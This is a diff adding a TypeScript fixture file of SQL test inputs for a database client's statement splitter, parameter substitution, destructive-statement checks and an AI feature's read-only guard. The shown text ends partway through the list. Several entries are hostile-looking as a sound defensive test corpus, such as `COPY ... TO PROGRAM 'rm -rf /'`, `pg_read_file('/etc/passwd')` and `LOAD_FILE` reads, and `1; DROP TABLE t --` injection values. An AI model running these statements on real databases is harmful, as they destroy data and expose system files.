@@ -1,0 +1,628 @@
+// The scanner corpus: SQL text for the statement splitter, statement at
+// cursor, the row-limit and count checks, the statement checks, the AI's
+// read-only check and {{param}} substitution. sql.fixtures.test.ts runs every
+// input for all six engine ids (split.json, statement-at.json, row-limit.json,
+// count-query.json, statements.json, read-only.json, params.json).
+//
+// Sources, in order: the spike's 15 splitter inputs, every input in
+// src/lib/engine/sql-scan.test.ts and src/lib/db/query-params.test.ts, the
+// cases phase 2's reviews added to query-params.ts, the six e2e schema.sql
+// files (whole), the sample queries, and new per-engine edge cases (including
+// the plan's examples for fixes 10–14).
+//
+// No lone surrogates: serde_json refuses them, and the Rust tests read these
+// fixtures. Task 8 tests lone surrogates at the wasm boundary instead.
+import { readFileSync } from "node:fs";
+import { sampleQueries } from "$lib/config/sample-queries";
+import type { DatabaseType } from "$lib/types";
+import { SqlDecimal } from "$lib/values";
+
+export const ENGINES: DatabaseType[] = [
+  "postgres",
+  "mysql",
+  "mariadb",
+  "sqlite",
+  "mssql",
+  "duckdb",
+];
+
+/** A parameter's value as a caller passes it (after a `Date` became its ISO text, decision 11). */
+export type ParamValue = string | number | bigint | boolean | null | SqlDecimal;
+
+export interface ScannerInput {
+  id: string;
+  sql: string;
+  /** Value sets for `substituteParameters`; one params.json case per set, engine and `forceInline`. */
+  values?: Record<string, ParamValue>[];
+}
+
+const repo = new URL("../../", import.meta.url);
+
+/** Default values for an input with parameters and no `values` of its own. */
+export const DEFAULT_VALUE = "v";
+
+// ---------------------------------------------------------------------------
+// The spike's splitter inputs (spike/harness/scanners.test.ts)
+// ---------------------------------------------------------------------------
+
+const SPIKE: [string, string][] = [
+  ["spike:semicolon-in-string", "SELECT 'a;b'; SELECT 2"],
+  ["spike:dollar-tag", "DO $fn$ BEGIN PERFORM 1; END $fn$; SELECT 2"],
+  ["spike:e-string-backslash", String.raw`SELECT E'a\';b'; SELECT 2`],
+  ["spike:nested-comment", "SELECT 1 /* a /* b; */ c; */; SELECT 2"],
+  ["spike:hash-comment", "SELECT 1 # x; y\n; SELECT 2"],
+  ["spike:backslash-escape", String.raw`SELECT 'a\';b'; SELECT 2`],
+  ["spike:backtick-name", "SELECT `a;b` FROM t; SELECT 2"],
+  ["spike:backtick-with-quote", "SELECT `it's` FROM t; SELECT 2"],
+  ["spike:bracket-name", "SELECT [a;b] FROM t; SELECT 2"],
+  ["spike:bracket-with-quote", "SELECT [it's] FROM t; SELECT 2"],
+  ["spike:param", "SELECT * FROM t WHERE a = {{id}}; SELECT 2"],
+  ["spike:unterminated-string", "SELECT 1; SELECT 'abc"],
+  ["spike:unterminated-comment", "SELECT 1; SELECT 2 /* todo"],
+];
+// The spike ran "nested comment" on three engines (postgres, duckdb, mssql),
+// which makes 15 cases from 13 inputs; here every input runs on all six.
+
+// ---------------------------------------------------------------------------
+// src/lib/engine/sql-scan.test.ts
+// ---------------------------------------------------------------------------
+
+const OVER = "SELECT ROW_NUMBER() OVER (ORDER BY a) AS rn FROM t";
+const LIVE_OVER = "SELECT name, ROW_NUMBER() OVER (ORDER BY name) AS rn FROM sys.types";
+const LIVE_SUB = "SELECT * FROM (SELECT TOP 3 name FROM sys.types ORDER BY name) s";
+
+const SQL_SCAN_TEST: string[] = [
+  "SELECT * FROM t LIMIT 10",
+  "select * from t limit 10 offset 5",
+  "SELECT * FROM t\nLIMIT\n10",
+  "SELECT * FROM t",
+  "SELECT 'no limit here' FROM t",
+  "SELECT * FROM t -- LIMIT 10\n",
+  "SELECT * FROM t /* LIMIT 10 */",
+  "SELECT * FROM (SELECT * FROM t LIMIT 5) s",
+  "SELECT t.limit, t.offset FROM t",
+  "SELECT * FROM t WHERE a = 'it''s LIMIT'",
+  'SELECT "limit" FROM t',
+  'SELECT "a""limit" FROM t',
+  "SELECT `limit` FROM t",
+  "SELECT `a``limit` FROM t",
+  'SELECT [limit], `offset`, "top" FROM t',
+  "SELECT [a]]limit] FROM t",
+  'SELECT "top" FROM t',
+  String.raw`SELECT 'a\' LIMIT 1' FROM t`,
+  'SELECT "x LIMIT 1" FROM t',
+  "SELECT * FROM t # LIMIT 1\n",
+  "SELECT a#b LIMIT 1\nFROM t",
+  "SELECT a#b\nFROM t LIMIT 1",
+  "SELECT x#y FROM t",
+  "SELECT * FROM #tmp",
+  "SELECT 5--1\nFROM t LIMIT 1",
+  String.raw`SELECT E'a\' LIMIT 1' FROM t`,
+  "SELECT $$ LIMIT 1 $$ FROM t",
+  "SELECT $fn$ it's LIMIT 1 $fn$ FROM t",
+  "SELECT 1 /* a /* LIMIT 1 */ LIMIT 2 */",
+  "SELECT $1::int LIMIT 5",
+  String.raw`SELECT 'a\' FROM t LIMIT 1`,
+  String.raw`SELECT 'a\' FROM t ORDER BY a OFFSET 0 ROWS`,
+  "SELECT 1 /* a /* b */ LIMIT 2",
+  "SELECT TOP 10 * FROM t",
+  "SELECT DISTINCT TOP (5) a FROM t",
+  "SELECT * FROM t ORDER BY a OFFSET 10 ROWS FETCH NEXT 5 ROWS ONLY",
+  "SELECT * FROM (SELECT TOP 5 * FROM t ORDER BY a) s",
+  "SELECT 'TOP 5' FROM t",
+  "SELECT top FROM t",
+  "SELECT * FROM t FETCH FIRST 5 ROWS ONLY",
+  "SELECT * FROM t ORDER BY a DESC, b",
+  "SELECT a FROM t\nUNION ALL SELECT a FROM u\norder by 1",
+  OVER,
+  "SELECT * FROM (SELECT TOP 3 * FROM t ORDER BY a) s WHERE x = 'ORDER BY'",
+  `${OVER} ORDER BY rn`,
+  "SELECT [order by] FROM t",
+  "SELECT TOP 5 * FROM t ORDER BY a",
+  "SELECT * FROM t ORDER BY a OFFSET 5 ROWS",
+  LIVE_OVER,
+  `${LIVE_OVER} ORDER BY rn`,
+  LIVE_SUB,
+  `${LIVE_SUB} ORDER BY name DESC`,
+  "SELECT TOP 5 name FROM sys.types ORDER BY name",
+  "SELECT * FROM t ORDER BY a",
+  "SELECT (a) -- x\n FROM t",
+  "SELECT 'abc",
+  "SELECT [abc",
+];
+
+// ---------------------------------------------------------------------------
+// src/lib/db/query-params.test.ts (with the values each test passes; bytes
+// left out, since the port rejects them under decision 11)
+// ---------------------------------------------------------------------------
+
+const QUERY_PARAMS_TEST: [string, Record<string, ParamValue>[]][] = [
+  // Postgres/SQLite
+  ["SELECT * FROM t WHERE a = {{a}} AND b LIKE '%{{b}}%' AND c = {{a}}", [{ a: 1, b: "x" }]],
+  // MySQL/MariaDB
+  ["SELECT * FROM t WHERE a = {{a}} AND b = {{b}} OR c = {{a}}", [{ a: 1, b: "two" }]],
+  ["SELECT * FROM t WHERE name LIKE '%{{name}}%' AND id > {{id}}", [{ name: "Ann", id: 5 }]],
+  [String.raw`SELECT '{{a}}-{{b}} it''s \'x\' 100\% a\\b'`, [{ a: "x", b: 2 }]],
+  ['SELECT "a{{p}}"', [{ p: "b" }]],
+  ["SELECT '%{{p}}%'", [{ p: null }]],
+  ["SELECT '{{missing}}'", [{}]],
+  ["SELECT 'v={{p}}'", [{ p: true }]],
+  [
+    "SELECT 'it''s {x}', `we'ird` FROM t -- {{a}}\n# {{a}}\n/* {{a}} */ WHERE a = {{a}}",
+    [{ a: 7 }],
+  ],
+  ["SELECT `{{c}}`, `a``{{c}}` FROM t WHERE a = {{c}}", [{ c: 1 }]],
+  ["SELECT N'{{c}}'", [{ c: "x" }]],
+  ["SELECT n'{{c}}'", [{ c: "x" }]],
+  ["SELECT _utf8mb4'{{c}}'", [{ c: "x" }]],
+  ["SELECT _utf8mb4 '{{c}}'", [{ c: "x" }]],
+  ["SELECT _utf8mb4\n  '{{c}}'", [{ c: "x" }]],
+  ['SELECT _latin1"{{c}}"', [{ c: "x" }]],
+  ["SELECT 1 N '{{c}}'", [{ c: "x" }]],
+  ["SELECT N'a', _utf8mb4'b', colN = {{c}}", [{ c: 1 }]],
+  ["SELECT '{{c}}' 'z'\n  \"y\", 1", [{ c: "x" }]],
+  ["SELECT N'a' '{{c}}'", [{ c: "x" }]],
+  ["SELECT /*! {{a}}, '%{{a}}' */ /*!80000 {{a}} */ /* {{a}} */ 1", [{ a: 2 }]],
+  ["SELECT {{a}}, '%{{b}}%'", [{ a: 1, b: "x" }]],
+  // SQL Server
+  [
+    "SELECT * FROM t WHERE a = {{a}} AND b = {{b}} OR c = {{a}} AND d = {{d}}",
+    [{ a: 1, b: "東京", d: null }],
+  ],
+  [
+    "SELECT {{t}}, {{big}}, {{dec}}",
+    [{ t: true, big: 9007199254740993n, dec: new SqlDecimal("-0.50") }],
+  ],
+  ["SELECT {{p}}, 'x{{p}}'", [{ p: "it's" }]],
+  ["SELECT TOP {{n}} * FROM t", [{ n: 5 }]],
+  ["CREATE VIEW v AS SELECT * FROM t WHERE name = {{v}}", [{ v: "a" }]],
+  ["DECLARE @p1 int = {{a}}; SELECT @p1, @P1 WHERE x = {{b}}", [{ a: 3, b: "y" }]],
+  ["SELECT * FROM t WHERE name LIKE N'%{{p}}%'", [{ p: "東京" }]],
+  ["SELECT * FROM t WHERE name LIKE '%{{p}}%'", [{ p: "東京" }]],
+  ["SELECT '%{{p}}%', '{{q}}'", [{ p: "Ann", q: null }]],
+  ["SELECT CASE x WHEN'{{a}}' THEN 1 END", [{ a: "é" }]],
+  ["-- it's\nSELECT * FROM t WHERE a = {{x}} -- ok'", [{ x: "1; DROP TABLE t --" }]],
+  ["SELECT [it's], [a]]'{{x}}], {{x}}", [{ x: "1; DROP TABLE t --" }]],
+  ['SELECT "it\'s", "a""\'", {{x}}', [{ x: "1; DROP TABLE t --" }]],
+  ["/* don't /* nest'ed */ */ SELECT {{x}} /* {{x}} */", [{ x: "é" }]],
+  [
+    "SELECT 5-{{a}}, 5-{{b}}, 5-{{c}}, 5-{{d}}",
+    [{ a: -1, b: -9007199254740993n, c: new SqlDecimal("-0.5"), d: 2 }],
+  ],
+  ["SELECT * FROM t WHERE a LIKE{{p}} AND TOP{{n}}", [{ p: "a", n: 5 }]],
+  [
+    "SELECT {{d}}, '{{d}}'",
+    [
+      { d: new SqlDecimal("1e5") },
+      { d: new SqlDecimal("-1.5E-3") },
+      { d: new SqlDecimal("1.25e1") },
+      { d: new SqlDecimal("12.50") },
+    ],
+  ],
+  ["SELECT {{a}}", [{ a: "x" }]],
+  // DuckDB
+  ["SELECT * FROM t WHERE a = {{a}} AND b = {{b}} AND c = {{c}}", [{ a: 1, b: "it's", c: null }]],
+  [
+    "SELECT {{big}}, {{dec}}, {{t}}",
+    [{ big: 9007199254740993n, dec: new SqlDecimal("1e-3"), t: true }],
+  ],
+  ["SELECT * FROM t WHERE n LIKE '%{{p}}%'", [{ p: "it's" }]],
+  [String.raw`SELECT E'a\'{{p}}'`, [{ p: String.raw`x\y` }]],
+  ["SELECT $$it's {{p}}$$", [{ p: "a'b" }]],
+  ["SELECT {{a}} -- it's\n, {{b}}", [{ a: 1, b: "x" }]],
+  ["SELECT /* it's /* nested */ {{a}} */ {{a}}", [{ a: 1 }]],
+  ['SELECT "it\'s ""{{a}}""" FROM t WHERE x = {{a}}', [{ a: "v" }]],
+  ["-- don't\nSELECT {{p}}", [{ p: "x" }]],
+  [
+    "SELECT $${{p}}$$ AS v",
+    [{ p: "$$ AS v, 42 AS injected --" }, { p: "a$$b" }, { p: "costs $5" }],
+  ],
+  ["SELECT $t${{p}}$t$", [{ p: "x $t$ y" }, { p: "a $$ b $u$ c $" }]],
+  ["SELECT $1, {{a}}", [{ a: 2 }]],
+  ["SELECT 5-{{x}}", [{ x: -1 }, { x: new SqlDecimal("-0.5") }]],
+  ["SELECT * FROM t LIMIT{{n}}", [{ n: 3 }]],
+];
+
+// ---------------------------------------------------------------------------
+// Cases phase 2's reviews added to query-params.ts, beyond the tests above
+// ---------------------------------------------------------------------------
+
+const PHASE2_REVIEW: [string, string, Record<string, ParamValue>[]][] = [
+  ["review:n-literal-non-ascii", "SELECT N'{{p}}', '{{p}}', {{p}}", [{ p: "東京" }, { p: "abc" }]],
+  ["review:top-param", "SELECT TOP {{n}} name FROM t ORDER BY name", [{ n: 10 }]],
+  [
+    "review:minus-negative",
+    "SELECT 1-{{p}}, 1 - {{p}}, -{{p}}",
+    [{ p: -1 }, { p: -1n }, { p: new SqlDecimal("-1") }, { p: 1 }],
+  ],
+  [
+    "review:param-in-comments-and-names",
+    'SELECT [{{p}}], "{{p}}", `{{p}}` -- {{p}}\n/* {{p}} */ FROM t WHERE a = {{p}}',
+    [{ p: 1 }],
+  ],
+  [
+    "review:duckdb-tag-in-value",
+    "SELECT $q${{p}}$q$, $${{p}}$$",
+    [{ p: "no tags" }, { p: "has $q$ inside" }, { p: "has $$ inside" }],
+  ],
+  [
+    "review:mysql-introducers",
+    "SELECT _binary'{{a}}', _utf8mb4 X'41', N\"{{a}}\", _latin1 'x' '{{a}}'",
+    [{ a: "é" }],
+  ],
+  ["review:mysql-adjacent", "SELECT 'a' \"{{a}}\" 'b', 'c'\n'{{a}}'", [{ a: "x" }, { a: null }]],
+  [
+    "review:mysql-executable-comment",
+    "SELECT 1 /*!50700 + {{a}} */ /*!+{{a}}*/ /*+ {{a}} */",
+    [{ a: 4 }],
+  ],
+  [
+    "review:number-formats",
+    "SELECT {{a}}, {{b}}, {{c}}, {{d}}, {{e}}, {{f}}",
+    [{ a: 1e21, b: -0, c: 0.1, d: 1.5e-7, e: 123456789012, f: Number.NaN }],
+  ],
+  [
+    "review:non-finite",
+    "SELECT {{a}}, '{{a}}', {{b}}, '{{c}}'",
+    [{ a: Number.POSITIVE_INFINITY, b: Number.NEGATIVE_INFINITY, c: Number.NaN }],
+  ],
+];
+
+// ---------------------------------------------------------------------------
+// New per-engine edge cases, including the plan's examples for fixes 10–14
+// ---------------------------------------------------------------------------
+
+const EDGE: [string, string, Record<string, ParamValue>[]?][] = [
+  // `#`: a comment on MySQL/MariaDB (even mid-word), part of a name on T-SQL.
+  ["edge:hash-mid-word", "SELECT a#b; SELECT 2\n; SELECT 3"],
+  ["edge:hash-temp-table", "SELECT * INTO #temp FROM t; SELECT * FROM #temp"],
+  ["edge:hash-leading-comment", "# note; not code\nSELECT 1; SELECT 2"],
+  ["edge:mysql-executable-comment", "SELECT /*!40100 1; */ 2; SELECT 3"],
+  ["edge:mysql-dash-dash", "SELECT 1--2; SELECT 3 -- c; x\n; SELECT 4"],
+  ["edge:mysql-dash-dash-eof", "SELECT 1 --"],
+  ["edge:mysql-double-quote-backslash", String.raw`SELECT "a\";b"; SELECT 2`],
+  ["edge:mysql-single-backslash-end", String.raw`SELECT 'a\\'; SELECT 'b'`],
+  // Postgres/DuckDB strings
+  ["edge:e-string-quote", String.raw`SELECT E'\''; SELECT 2`],
+  ["edge:e-string-after-word", String.raw`SELECT xe'\'; SELECT 2'; SELECT 3`],
+  ["edge:dollar-param-vs-tag", "SELECT $1; SELECT $a$;$a$; SELECT $2"],
+  ["edge:dollar-tag-unicode", "SELECT $ü$;$ü$; SELECT 2"],
+  ["edge:dollar-in-word", "SELECT a$b$c; SELECT 2"],
+  ["edge:nested-comment-semicolons", "SELECT 1 /* a /* ; */ b ; */; SELECT 2"],
+  // Brackets: `]]` escapes on SQL Server only.
+  ["edge:bracket-escape", "SELECT [a]];b] FROM t; SELECT 2"],
+  ["edge:bracket-quote", "SELECT [a'b], 'c;d' FROM t; SELECT 2"],
+  ["edge:backtick-escape", "SELECT `a``;b` FROM t; SELECT 2"],
+  ["edge:double-quote-escape", 'SELECT "a"";b" FROM t; SELECT 2'],
+  // Unterminated at the end, one per quote style (each input runs on every engine).
+  ["edge:open-single", "SELECT 1; SELECT 'abc;def"],
+  ["edge:open-double", 'SELECT 1; SELECT "abc;def'],
+  ["edge:open-backtick", "SELECT 1; SELECT `abc;def"],
+  ["edge:open-bracket", "SELECT 1; SELECT [abc;def"],
+  ["edge:open-e-string", String.raw`SELECT 1; SELECT E'ab\';def`],
+  ["edge:open-n-string", "SELECT 1; SELECT N'東京;"],
+  ["edge:open-dollar", "SELECT 1; SELECT $$abc;def"],
+  ["edge:open-dollar-tag", "SELECT 1; SELECT $t$abc;def $t"],
+  ["edge:open-block-comment", "SELECT 1; SELECT 2 /* abc;def"],
+  ["edge:open-nested-comment", "SELECT 1; SELECT 2 /* a /* b */ c;d"],
+  ["edge:open-line-comment", "SELECT 1; SELECT 2 -- abc;def"],
+  ["edge:open-hash-comment", "SELECT 1; SELECT 2 # abc;def"],
+  ["edge:open-string-param", "SELECT {{a}}; SELECT '{{a}}", [{ a: "x" }]],
+  ["edge:open-comment-param", "SELECT {{a}} /* {{a}}", [{ a: "x" }]],
+  // Only comments, empty input, bare semicolons, CRLF
+  ["edge:only-line-comment", "-- just a comment"],
+  ["edge:only-block-comment", "/* c; d */"],
+  ["edge:only-hash-comment", "# c; d"],
+  ["edge:only-comments-mixed", "-- a;\n/* b; */\n# c;\n"],
+  ["edge:comment-statement-between", "SELECT 1; -- nothing here\n; SELECT 2"],
+  ["edge:empty", ""],
+  ["edge:whitespace", "  \n\t "],
+  ["edge:semicolons", ";;"],
+  ["edge:spaced-semicolons", " ; ;\n; "],
+  ["edge:double-semicolon", "SELECT 1;;SELECT 2;"],
+  ["edge:crlf", "SELECT 1;\r\nSELECT 2;\r\n-- c\r\nSELECT 3"],
+  ["edge:trailing-whitespace", "SELECT 1;   \n  "],
+  // Non-ASCII and astral characters before and after the cursor
+  ["edge:tokyo-emoji", "SELECT '東京' AS city;\nSELECT '😀' AS face;\nSELECT 3"],
+  ["edge:emoji-names", 'SELECT 東京 FROM 😀t; SELECT "😀" FROM 東京'],
+  ["edge:emoji-comment", "-- 😀;\nSELECT 1; SELECT '😀;' /* 東京; */"],
+  // Not split by anyone (Follow-ups): GO, BEGIN … END, DELIMITER
+  ["edge:go-batch", "SELECT 1\nGO\nSELECT 2"],
+  ["edge:begin-end", "CREATE PROCEDURE p() BEGIN SELECT 1; SELECT 2; END; SELECT 3"],
+  ["edge:delimiter", "DELIMITER //\nSELECT 1//\nDELIMITER ;\nSELECT 2;"],
+  // Fix 11: the destructive check and the query type see through strings and comments.
+  ["fix11:delete-comment-where", "DELETE FROM t -- WHERE id = 1"],
+  ["fix11:update-string-where", "UPDATE t SET note = 'see WHERE'"],
+  ["fix11:hash-hides-delete", "# clean up\nDELETE FROM t"],
+  ["fix11:hash-select", "# note\nSELECT 1"],
+  ["fix11:nested-comment-select", "/* a /* b */ c */ SELECT 1"],
+  ["fix11:delete-with-where", "DELETE FROM t WHERE id = 1"],
+  ["fix11:cte-delete", "WITH x AS (SELECT id FROM t) DELETE FROM t"],
+  ["fix11:cte-delete-where", "WITH x AS (SELECT id FROM t WHERE a) DELETE FROM t"],
+  ["fix11:paren-delete-in-string", "SELECT '(x) delete' AS s"],
+  ["fix11:drops", "DROP TABLE t; DROP INDEX i; DROP VIEW v; DROP SCHEMA s; DROP DATABASE d"],
+  ["fix11:drop-quoted", 'DROP /* c */ TABLE "t"'],
+  ["fix11:truncate", "TRUNCATE TABLE t"],
+  ["fix11:alter-drop-column", "ALTER TABLE t DROP COLUMN c"],
+  ["fix11:alter-string-drop-column", "ALTER TABLE t ADD c text DEFAULT 'DROP COLUMN'"],
+  ["fix11:insert", "INSERT INTO t VALUES (1)"],
+  ["fix11:selected-word", "SELECTED 1"],
+  // Fix 12: the source table for inline editing is the first top-level FROM.
+  ["fix12:extract-from", "SELECT EXTRACT(YEAR FROM created_at) FROM orders"],
+  ["fix12:extract-from-id", "SELECT EXTRACT(YEAR FROM created_at), id FROM orders"],
+  [
+    "fix12:select-subquery",
+    "SELECT o.id, (SELECT u.name FROM users u WHERE u.id = o.user_id) FROM orders o",
+  ],
+  ["fix12:from-in-string", "SELECT 'a FROM b' AS s FROM t"],
+  ["fix12:from-in-comment", "SELECT a -- FROM b\nFROM t"],
+  ["fix12:backtick-schema", "SELECT * FROM `Sales`.`customers`"],
+  ["fix12:bracket-schema", "SELECT * FROM [Sales].[customers] WHERE id = 1"],
+  ["fix12:double-quote-schema", 'SELECT * FROM "Sales"."order items"'],
+  ["fix12:non-ascii", "SELECT * FROM 東京"],
+  ["fix12:non-ascii-quoted", 'SELECT * FROM "Größe"'],
+  ["fix12:plain", "SELECT id, name FROM public.users WHERE id > 1"],
+  ["fix12:join", "SELECT * FROM a JOIN b ON a.id = b.id"],
+  ["fix12:from-subquery", "SELECT * FROM (SELECT * FROM users) u"],
+  ["fix12:table-function", "SELECT * FROM generate_series(1, 3)"],
+  ["fix12:three-part", "SELECT * FROM db.dbo.t"],
+  ["fix12:lowercase-from", "select * from Orders"],
+  // Fix 13: {{param}} on Postgres/SQLite skips comments and quoted names.
+  ["fix13:comment", "SELECT 1 -- {{x}}", [{ x: 1 }]],
+  ["fix13:quoted-name-and-string", "SELECT \"it's\", {{x}}, 'a{{x}}'", [{ x: "v" }]],
+  ["fix13:e-string", String.raw`SELECT E'a\n{{x}}\t'`, [{ x: "v" }]],
+  ["fix13:do-block", "DO $$ BEGIN RAISE NOTICE '{{p}}'; END $$", [{ p: "hi" }, { p: 5 }]],
+  ["fix13:dollar-tag-holds-tag", "SELECT $tag${{p}}$tag$", [{ p: "a $tag$ b" }, { p: null }]],
+  ["fix13:block-comment-quote", "/* it's */ SELECT {{a}}, '{{a}}'", [{ a: "x" }]],
+  // Fix 14: the AI's read-only check runs on tokens.
+  ["fix14:copy-program", "SELECT 1; COPY t TO PROGRAM 'rm -rf /'"],
+  ["fix14:string-drop", "SELECT 'DROP TABLE' AS s"],
+  ["fix14:leading-comment", "-- note\nSELECT 1"],
+  ["fix14:cte-dml", "WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d"],
+  ["fix14:for-update", "SELECT * FROM t FOR UPDATE"],
+  ["fix14:replace-function", "SELECT REPLACE(name, 'a', 'b') FROM t"],
+  ["fix14:insert-function", "SELECT INSERT('abc', 1, 1, 'x')"],
+  ["fix14:select-into", "SELECT * INTO new_t FROM t"],
+  ["fix14:set", "SELECT 1; SET search_path = x"],
+  ["fix14:attach", "SELECT 1; ATTACH 'x.db' AS x"],
+  ["fix14:pragma", "SELECT 1; PRAGMA foo"],
+  ["fix14:call", "WITH a AS (SELECT 1) SELECT * FROM a; CALL p()"],
+  ["fix14:exec-no-semicolon", "SELECT 1 EXEC('DROP TABLE t')"],
+  ["fix14:merge", "SELECT 1; MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE"],
+  ["fix14:install-load", "SELECT 1; INSTALL httpfs; LOAD httpfs"],
+  ["fix14:vacuum", "SELECT 1; VACUUM"],
+  ["fix14:lock", "SELECT 1; LOCK TABLE t"],
+  ["fix14:do", "SELECT 1; DO $$ BEGIN END $$"],
+  ["fix14:dotted-keyword", "SELECT t.set, t.load FROM t"],
+  ["fix14:plain-select", "SELECT a, b FROM t WHERE c = 1"],
+  ["fix14:with-select", "WITH x AS (SELECT 1 AS a) SELECT a FROM x"],
+  ["fix14:dml-in-comment", "SELECT 1 /* DELETE FROM t */ -- DROP TABLE t"],
+  // MySQL/MariaDB executable comments are code (fixes 10, 11, 14; review).
+  ["exec:delete", "SELECT 1; /*! DELETE FROM rv */"],
+  ["exec:into", "SELECT 1 /*! INTO @x */"],
+  ["exec:for-update", "SELECT * FROM t /*! FOR UPDATE */"],
+  ["exec:mariadb", "SELECT 1 /*M! ; DELETE FROM t */"],
+  ["exec:versioned-split", "SELECT 1 /*!50700 ; SELECT 2 */; SELECT 3"],
+  ["exec:set-names", "/*!40101 SET NAMES utf8 */; SELECT 1"],
+  ["exec:leading-delete", "/*! DELETE FROM t */"],
+  ["exec:in-string", "SELECT '/*! not code */' AS s"],
+  // Number tokens end where the literal ends (fix 18).
+  ["fix18:dot-into", "SELECT 1. INTO newtable"],
+  ["fix18:number-into", "SELECT x = 1INTO #q"],
+  ["fix18:decimal-into", "SELECT 1.5INTO @z"],
+  ["fix18:exponent-into", "SELECT 1e5INTO t FROM u"],
+  ["fix18:number-limit", "SELECT a FROM t WHERE 1=1LIMIT 5"],
+  ["fix18:numbers", "SELECT .5, 1e5, 2.5e-3, 1e, 0x1F, 3.limit, t1.a FROM t"],
+  ["fix18:number-dollar", "SELECT 1$$;$$; SELECT 2"],
+  // SQL Server runs statements without a `;` between them (fix 14).
+  ["fix14:mssql-kill", "SELECT 1 AS k KILL 9999"],
+  ["fix14:mssql-shutdown", "SELECT 1 SHUTDOWN"],
+  ["fix14:mssql-dbcc", "SELECT 1 DBCC CHECKDB"],
+  ["fix14:mssql-waitfor", "SELECT 1 WAITFOR DELAY '00:00:10'"],
+  ["fix14:mssql-declare", "SELECT 1 DECLARE @x int"],
+  ["fix14:mssql-save-tran", "SELECT 1 SAVE TRANSACTION s"],
+  ["fix14:mssql-begin-tran", "SELECT 1 BEGIN TRAN"],
+  ["fix14:mssql-use", "SELECT 1 USE master"],
+  ["fix14:mssql-fetch", "SELECT * FROM t ORDER BY a OFFSET 0 ROWS FETCH NEXT 5 ROWS ONLY"],
+  // Functions with outside effects (fix 14).
+  ["fix14:fn-terminate", "SELECT pg_terminate_backend(123)"],
+  ["fix14:fn-dblink", "SELECT * FROM dblink('x', 'DELETE FROM t') AS t(a int)"],
+  ["fix14:fn-dblink-exec", "SELECT dblink_exec('x', 'y')"],
+  ["fix14:fn-qualified", "SELECT pg_catalog.pg_read_file('/etc/passwd')"],
+  ["fix14:fn-set-config", "SELECT set_config('a', 'b', false)"],
+  ["fix14:fn-sequences", "SELECT nextval('s'), setval('s', 1)"],
+  ["fix14:fn-openrowset", "SELECT * FROM OPENROWSET('SQLNCLI', 'x', 'SELECT 1')"],
+  ["fix14:fn-load", "SELECT load_extension('x'), LOAD_FILE('/etc/passwd')"],
+  ["fix14:fn-lo-import", "SELECT lo_import('/etc/passwd')"],
+  ["fix14:fn-name-no-call", "SELECT nextval FROM t"],
+  // MySQL: refused if either sql_mode reading finds a write (fix 14).
+  ["fix14:mysql-backslash-reading", String.raw`SELECT 'x\'; DELETE FROM t; -- '`],
+  ["fix14:mysql-ansi-reading", String.raw`SELECT "a\"; DELETE FROM t; -- "`],
+  // Destructive statements the confirmation missed (fix 11).
+  ["fix11:explain-analyze-delete", "EXPLAIN ANALYZE DELETE FROM t"],
+  ["fix11:explain-options-update", "EXPLAIN (ANALYZE, COSTS OFF) UPDATE t SET a = 1"],
+  ["fix11:explain-delete", "EXPLAIN DELETE FROM t"],
+  ["fix11:alter-drop-no-column", "ALTER TABLE t DROP c"],
+  ["fix11:alter-drop-default", "ALTER TABLE t ALTER COLUMN c DROP DEFAULT"],
+  ["fix11:alter-drop-constraint", "ALTER TABLE t DROP CONSTRAINT t_pk"],
+  ["fix11:merge-delete", "MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE"],
+  [
+    "fix11:merge-update",
+    "MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN UPDATE SET a = s.a",
+  ],
+  ["fix11:drop-materialized-view", "DROP MATERIALIZED VIEW mv"],
+  ["fix11:drop-sequence", "DROP SEQUENCE s"],
+  ["fix11:drop-function", "DROP FUNCTION f()"],
+  ["fix11:drop-temporary-table", "DROP TEMPORARY TABLE tt"],
+  ["fix11:mssql-select-delete", "SELECT 1 DELETE FROM t"],
+  ["fix11:mssql-nocount-update", "SET NOCOUNT ON UPDATE t SET a = 1"],
+  ["fix11:mssql-nocount-update-where", "SET NOCOUNT ON UPDATE t SET a = 1 WHERE id = 2"],
+  ["fix11:mssql-delete-then-select-where", "DELETE FROM t SELECT 1 FROM u WHERE a = 1"],
+  [
+    "fix11:fk-actions",
+    "CREATE TABLE c (p int REFERENCES p (id) ON DELETE CASCADE ON UPDATE SET NULL)",
+  ],
+  ["fix11:on-duplicate-key", "INSERT INTO t VALUES (1) ON DUPLICATE KEY UPDATE a = 2"],
+  ["fix11:update-subquery-where", "UPDATE t SET a = (SELECT b FROM u WHERE u.id = 1)"],
+  ["fix11:delete-in-subquery", "DELETE FROM t WHERE id IN (SELECT id FROM u)"],
+  ["fix11:select-for-update", "SELECT * FROM t FOR UPDATE"],
+  // Task 2 re-review. SQL Server binary and money literals are numbers (fix 18).
+  ["fix18:mssql-binary-into", "SELECT a=0x1INTO #q"],
+  ["fix18:mssql-money-into", "SELECT a=$1INTO #m"],
+  ["fix18:mssql-money-decimal-into", "SELECT a=$1.5INTO #m"],
+  ["fix18:mssql-literals", "SELECT 0x1F AS b, $5 AS m, $abc FROM t LIMIT 1"],
+  // MySQL: a digit-led name is one word; `@` only starts a word (fix 18).
+  ["fix18:mysql-digit-name", "SELECT * FROM 2fa_codes"],
+  ["fix18:mysql-qualified-digit-name", "SELECT * FROM db.2fa_codes"],
+  ["fix18:mysql-digit-name-split", "SELECT 2fa_codes.id FROM 2fa_codes; SELECT 2"],
+  ["fix18:mysql-1into", "SELECT 1INTO @x"],
+  ["fix18:mysql-exponent-into", "SELECT 1e1INTO @v"],
+  ["fix18:mysql-into-at", "SELECT 1 INTO@x"],
+  // Quoted function names and more functions (fix 14).
+  ["fix14:fn-quoted", "SELECT \"setval\"('s', 1)"],
+  ["fix14:fn-unicode-escaped", "SELECT U&\"\\0073etval\"('s', 1)"],
+  ["fix14:fn-backtick", "SELECT `load_file`('/etc/passwd')"],
+  ["fix14:fn-qualified-quoted", "SELECT pg_catalog.\"pg_file_write\"('/tmp/x', 'y', false)"],
+  ["fix14:fn-large-objects", "SELECT lo_unlink(1)"],
+  ["fix14:fn-replication", "SELECT pg_create_logical_replication_slot('s', 'test_decoding')"],
+  ["fix14:fn-notify", "SELECT pg_notify('c', 'x')"],
+  ["fix14:fn-advisory-lock", "SELECT pg_advisory_lock(1)"],
+  ["fix14:fn-pg-sleep", "SELECT pg_sleep(1e9)"],
+  ["fix14:fn-stat-reset", "SELECT pg_stat_reset_shared('bgwriter')"],
